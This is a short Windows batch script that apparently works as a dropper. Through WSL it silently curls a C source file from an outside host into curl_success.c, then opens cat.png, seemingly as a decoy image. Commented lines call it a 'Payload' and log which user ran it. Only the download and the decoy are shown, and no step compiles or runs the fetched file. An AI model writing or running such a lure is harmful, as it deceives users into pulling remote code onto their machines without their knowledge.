@echo off
REM is comments
:: REM Log execution time
:: echo Payload ran by %USERNAME% at %DATE% %TIME% >> success.txt

@REM wsl ./a.out
@REM wsl bash -c "source ~/.bashrc"
@REM pause

wsl bash -c "curl -s -X POST -o curl_success.c https://cyber.stanleyhoo1.tech/files/pseudo.c 2>/dev/null"
start cat.png